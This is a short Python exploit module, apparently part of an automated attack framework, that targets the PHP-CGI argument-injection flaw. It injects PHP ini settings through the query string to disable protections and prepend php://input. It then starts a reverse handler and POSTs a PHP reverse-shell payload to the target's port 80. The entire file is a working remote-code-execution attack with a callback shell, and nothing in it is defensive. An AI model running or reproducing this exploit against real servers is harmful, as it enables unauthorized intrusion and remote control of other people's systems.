#!/usr/bin/python3

import requests

def exploit(args, port, reverse_handler):
    urlargs = [
               "-d+allow_url_include%3d1",
               "-d+safe_mode%3d0",
               "-d+suhosin.simulation%3don",
               "-d+disable_functions%3d%22%22",
               "-d+open_basedir%3dnone",
               "-d+auto_prepend_file%3dphp://input",
               "-n"
              ]

    qs = '+'.join(urlargs)
    target_uri = "/"
    uri = target_uri+"?"+qs
    host = "http://%s:%d%s" % (args.target, port, uri)
    reverse_handler.run()
    r = requests.post(host, reverse_handler.payload_PHP)

def run(args, data, reverse_handler):
    #tcp port scan doesnt do service discovery
    #so exploit will just try on port 80 till then
    print("\033[1;34m[*]\033[00m Attempting exploit: php_cgi_arg_injection")
    exploit(args, 80, reverse_handler)
